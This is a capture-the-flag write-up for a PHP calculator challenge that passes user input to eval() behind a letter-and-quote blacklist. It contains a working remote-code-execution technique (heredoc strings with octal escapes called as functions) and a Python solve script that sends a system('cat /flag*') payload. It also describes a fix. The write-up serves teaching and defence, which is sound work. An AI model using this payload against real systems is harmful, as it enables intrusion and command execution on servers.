## Overview

pcalc is a Medium web challenge: a PHP calculator that evaluates your formula with `eval()`. The only defenses are a length cap and a regex that rejects letters and quotes. That combination looks airtight but isn't — PHP has enough letter-free, quote-free syntax to build arbitrary strings and call any function, which turns the calculator into remote code execution.

## The technique

The whole sink is in `CalcModel::getCalc`:

```php
if (strlen($formula) >= 100 || preg_match_all('/[a-z\'"]+/i', $formula)) {
    return '🤡 dont bite the hand that feeds you human 🤡';
}
eval('$pcalc = ' . $formula . ';');
```

So the formula is concatenated directly into `eval()`, and the only restrictions are:

- `strlen($formula) < 100`
- No letters (`[a-z]` case-insensitively, so `A-Z` too) and no quotes (`'` or `"`) anywhere.

Everything else — digits, `\ ( ) < _ . , /` and newlines — is allowed. This is a classic [code injection](https://cwe.mitre.org/data/definitions/95.html) where the filter is a character blacklist rather than a parser.

The usual letter-free PHP trick builds strings via XOR/complement of non-letter bytes (`("" ^ "")`), but that needs quoted seed strings — and quotes are banned here. The way around both bans is **heredoc plus octal escapes**:

- A heredoc `<<<_` … `_` produces a string literal with no quotes at all, and the marker `_` isn't a letter.
- Heredocs use double-quoted semantics, so octal escapes `\NNN` inside them decode to any byte. `\163\171\163\164\145\155` is `"system"` — spelled without typing a letter.
- `(<string>)(<args>)` is a dynamic function call in PHP, so `("system")("cmd")` runs `system("cmd")`.

The flag isn't at a fixed path — the container's entrypoint moves it to `/flag<5 random chars>` at boot — so the command reads it with a shell glob.

## Solution

Assemble `(<heredoc→"system">)(<heredoc→"cat /flag*">)`. The payload below is 79 characters (under the 100 limit), contains no letters and no quotes, and `system()` echoes the command's stdout straight into the rendered page.

Create `solve.py`:

```python
#!/usr/bin/env python3
import urllib.parse, urllib.request, re

target = open('target.txt').read().strip()

def octal(s):
    return ''.join('\\%o' % b for b in s.encode())

def call(fn, arg):
    return f"(<<<_\n{octal(fn)}\n_)(<<<_\n{octal(arg)}\n_)"

payload = call("system", "cat /flag*")            # 79 chars, no letters/quotes
url = f"http://{target}/?formula=" + urllib.parse.quote(payload, safe='')
resp = urllib.request.urlopen(url, timeout=20).read().decode('latin1')
print(re.search(r'HTB\{[^}]*\}', re.sub(r'<[^>]+>', ' ', resp)).group(0))
```

Sent as the `formula` GET parameter (URL-encoding the newlines as `%0A`), the eval becomes `$pcalc = (system)(cat /flag*);`, the shell glob resolves the randomized filename, and the flag appears in the response.

```
HTB{...}
```

## Why it worked

A character blacklist can never "sanitize" input destined for an interpreter — PHP's grammar is rich enough to express any program without whatever characters you ban. Heredocs defeat the quote ban, octal escapes defeat the letter ban, and dynamic calls turn a bare string into `system()`. PHP 7.3+ flexible heredocs even let the closing marker be immediately followed by `)`, keeping the payload compact.

## Fix / defense

Don't feed user input to `eval()` — parse a calculator expression with a real math parser or AST allow-list that permits only numbers and `+ - * / ( )`. Defense in depth: run PHP-FPM as a low-privilege user, set `disable_functions` for `system`/`exec`/`shell_exec`/`passthru`/`popen`/`proc_open`, and constrain `open_basedir` so a glob read can't reach `/flag*` outside the web root.
